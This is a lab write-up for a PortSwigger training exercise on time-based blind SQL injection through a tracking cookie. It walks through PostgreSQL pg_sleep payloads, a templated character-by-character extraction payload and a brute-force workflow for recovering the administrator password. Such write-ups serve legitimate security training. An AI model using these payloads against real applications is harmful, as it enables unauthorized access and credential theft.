# 📝 Lab: Blind SQL Injection with Time Delays and Information Retrieval

* **Vulnerability:** Blind SQL Injection (Time-Based)
* **Difficulty:** PRACTITIONER
* **Objective:** Log in as the `administrator` user.

> **Description**
>
> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics and performs a SQL query containing the value of the submitted cookie.
>
> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
>
> The database contains a different table called `users`, with columns called `username` and `password`. We need to exploit the blind SQL injection vulnerability to retrieve the password of the `administrator` user.
>
> Once the password is recovered, log in as `administrator` to solve the lab.

---

## 🛠️ Tools Used

* Browser + FoxyProxy
* Burp Suite
* Python (optional)
* Burp Intruder (optional)

---

## 🐾 Steps to Reproduce

### 1. Intercept the Request

Open the lab homepage and intercept the request using **Burp Suite**.

Navigate to:

```text
Proxy → HTTP History
```

Right-click the request and send it to **Repeater** (`Ctrl + R`).

---

### 2. Confirm the SQL Injection Vulnerability

The `TrackingId` cookie is our target.

Inject the following payload into the cookie value:

```sql
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

Example:

```http
Cookie: TrackingId='||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--; session=<session>
```

If the application is vulnerable, the response will be delayed by approximately **5 seconds**.

You can easily observe this delay in Burp Repeater's response timer (bottom-right corner).

---

### 3. Extract Password Characters Using Time Delays

After confirming the vulnerability, we can start testing individual password characters.

Use a payload like:

```sql
'||(
SELECT CASE
WHEN SUBSTRING(password,1,1)='a'
THEN pg_sleep(5)
ELSE pg_sleep(0)
END
FROM users
WHERE username='administrator'
)--
```

What this does:

* Retrieves the administrator's password.
* Checks whether the first character equals `a`.
* If the condition is true, PostgreSQL sleeps for 5 seconds.
* If the condition is false, the response is immediate.

By changing:

```sql
SUBSTRING(password,1,1)
```

and

```sql
'a'
```

we can test different positions and characters.

---

### 4. Automate the Bruteforce Process

Manually testing each character would take forever because every correct guess introduces a delay.

To speed things up, use a brute-force tool such as:

* Burp Intruder
* Turbo Intruder
* [Custom Python script](https://github.com/noata5505/Portswigger-Lab-Burp-Community/blob/main/SQL-Injection/Tools/15_Bruteforce_Tool.py)

In this write-up, I used my own tool:

**Bruteforce Tool**

```text
https://github.com/noata5505/Portswigger-Lab-Burp-Community/blob/main/SQL-Injection/Tools/15_Bruteforce_Tool.py
```

Usage:

#### Run the Tool

Provide the lab URL:

```text
https://(YOUR-ID).web-security-academy.net/
```

Provide the following cookie payload template:

```sql
(YOUR-COOKIE)'||(
SELECT CASE
WHEN SUBSTRING(password,{i},1)='{char}'
THEN pg_sleep(5)
ELSE pg_sleep(0)
END
FROM users
WHERE username='administrator'
)--
```

Where:

* `{i}` = character position.
* `{char}` = candidate character.

The tool will automatically:

* Test each character.
* Detect response delays.
* Reconstruct the administrator password one character at a time.

> ☕ Grab a coffee while the script runs. Time-based SQLi is effective, but definitely not the fastest technique.

---

### 5. Log In as Administrator

Once the password has been recovered, use the credentials:

```text
Username: administrator
Password: <recovered_password>
```

Log in through the application's login page.

---

### 6. Verify the Solution

After a successful login, the lab will be marked as completed and the **"Lab Solved"** banner will appear.

---

## 💣 Payload

### Vulnerability Check

```sql
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

**Purpose:**

* Confirms SQL injection.
* Causes a 5-second delay when the injected query is executed.
* Verifies that user-controlled input reaches the database.

---

### Test a Single Password Character

```sql
'||(
SELECT CASE
WHEN SUBSTRING(password,1,1)='a'
THEN pg_sleep(5)
ELSE pg_sleep(0)
END
FROM users
WHERE username='administrator'
)--
```

**Purpose:**

* Checks whether the first password character is `a`.
* A delayed response means the guess is correct.
* An immediate response means the guess is incorrect.

---

### Generic Extraction Payload

```sql
'||(
SELECT CASE
WHEN SUBSTRING(password,{i},1)='{char}'
THEN pg_sleep(5)
ELSE pg_sleep(0)
END
FROM users
WHERE username='administrator'
)--
```

**Purpose:**

* Used for automated password extraction.
* Works by iterating through:
  * Password positions (`{i}`)
  * Candidate characters (`{char}`)
* A delay indicates a successful match.

---

### Example Cookie Request

```http
Cookie: TrackingId=xyz'||(
SELECT CASE
WHEN SUBSTRING(password,1,1)='a'
THEN pg_sleep(5)
ELSE pg_sleep(0)
END
FROM users
WHERE username='administrator'
)--; session=<session>
```

**Expected Result:**

```text
~5 second delay  → Character is correct
Immediate reply → Character is incorrect
```

---

## 🎯 Impact

Although the application never reveals query results directly, an attacker can still extract sensitive information using response timing.

A successful attacker could:

* Confirm the existence of a blind SQL injection vulnerability.
* Enumerate database contents without seeing any output.
* Extract usernames from the database.
* Recover passwords character-by-character using timing differences.
* Bypass application logic that hides errors and query results.
* Gain unauthorized access to privileged accounts.
* Compromise administrator credentials.
* Potentially access, modify, or delete sensitive data depending on database permissions.

**Risk:** High

**Attack Complexity:** Medium

**Privileges Required:** None

**Potential Business Impact:**

Because this is a blind SQL injection vulnerability, it may remain unnoticed during normal operation while still allowing attackers to slowly and reliably extract sensitive data from the backend database. Compromising an administrator account can ultimately lead to a full application takeover.

---

## 🔗 Reference

For more SQL injection payloads and database-specific syntax, check out the **[PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)**
